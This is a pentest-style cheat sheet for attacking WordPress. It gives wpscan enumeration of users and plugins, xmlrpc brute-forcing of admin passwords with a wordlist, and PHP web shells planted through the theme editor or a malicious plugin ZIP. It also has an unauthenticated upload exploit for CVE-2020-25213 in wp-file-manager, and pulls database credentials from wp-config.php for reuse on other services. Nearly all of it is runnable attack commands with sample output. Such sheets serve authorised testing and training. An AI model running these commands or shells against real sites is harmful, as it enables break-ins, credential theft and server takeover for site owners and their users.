# WordPress

### Enumerate WordPress

Full enumeration — Users, plugins, themes, versions

```bash
wpscan --url http://$IP/ -e ap,at,u --api-token YOUR_TOKEN
```

<details>
<summary>Example Output</summary>

```
[+] WordPress version 5.7.2
[+] User(s) Identified:
 - admin
 - editor
[+] Plugins Found:
 - wp-file-manager 6.0 (vulnerable!)
```
</details>

---

### Brute force WordPress login

Target /wp-login.php with found usernames — Use xmlrpc for speed

```bash
wpscan --url http://$IP/ -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

<details>
<summary>Example Output</summary>

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / monkey123
```
</details>

---

### RCE via Theme Editor

Edit a PHP theme file to inject a shell — Requires admin access

```bash
# Appearance → Theme Editor → 404.php
# Replace content with:
<?php system($_GET['cmd']); ?>
# Visit: http://$IP/wp-content/themes/twentytwentyone/404.php?cmd=id
```

<details>
<summary>Example Output</summary>

```
uid=33(www-data) gid=33(www-data)
```
</details>

---

### RCE via Plugin Upload

Upload a malicious plugin ZIP — Requires admin access

```bash
# Create malicious plugin
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip plugin-shell.zip shell.php
# Plugins → Add New → Upload Plugin → Install → Activate
# Visit: http://$IP/wp-content/plugins/shell.php?cmd=id
```

---

### WP File Manager RCE (CVE-2020-25213)

Unauthenticated file upload — wp-file-manager < 6.9

```bash
curl -F 'cmd=upload' -F 'target=l1_Lw' -F 'upload[]=@shell.php' http://$IP/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
```

---

### Extract credentials from wp-config.php

Database creds stored in plaintext — Check for password reuse

```bash
cat /var/www/html/wp-config.php | grep -i "DB_"
```

<details>
<summary>Example Output</summary>

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_admin');
define('DB_PASSWORD', 'SuperSecretDBPass!');
define('DB_HOST', 'localhost');
Try this password on SSH, FTP, other services
```
</details>

---
